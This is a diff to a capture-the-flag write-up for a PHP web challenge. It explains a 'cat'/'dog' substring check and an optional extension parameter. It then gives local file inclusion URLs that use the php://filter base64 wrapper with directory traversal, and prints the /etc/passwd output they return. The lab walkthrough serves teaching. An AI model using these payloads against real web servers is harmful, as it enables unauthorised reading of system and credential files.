@@ -57,7 +57,39 @@
 
 + **Let's understand this php code to see what's happening behind:** 
 We have a **containsStr** function which returns the first occurence of a substring in a string; it's like the C **strstr** function.
-There's a **$ext** variable which will be used to set a specific extension: we saw before that every string that we insert will end by having a *php* extension.
-First, the script checks if the view parameter is not NULL, then checks if the query string contains the cat or dog substrings. If this happens, we get the inclusion and simultanously the extension is set
 
+Another thing it's that **$ext** variable which will be checked inside the URL parameter: if **$ext** exists, the URL file's extension will be used, else there will be set a *php* extension. We saw before that every string that we insert will end by having a *php* extension.
 
+Then, the script checks if the view parameter is not NUL and checks if the query string contains the cat or dog substrings. If this happens, we get the inclusion and simultanously the extension is set with our **$ext**. 
+
+So, we need to insert a **$ext** variable inside our view parameter, but without some value so we can read any file on the system
+
++ **We can read our first flag1 using the same wrapper, which outputs the flag php page now, encoded with the same base64**
+
+``http://10.10.23.37/?view=php://filter/convert.base64-encode/cat/resource=flag``
+
++ **Let's move on and try to read the /etc/passwd file. I included the $ext value in the URL too**
+
+``http://10.10.23.37/?view=php://filter/convert.base64-encode/cat/resource=../../../../etc/passwd&ext=``
+
+```bash
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+```
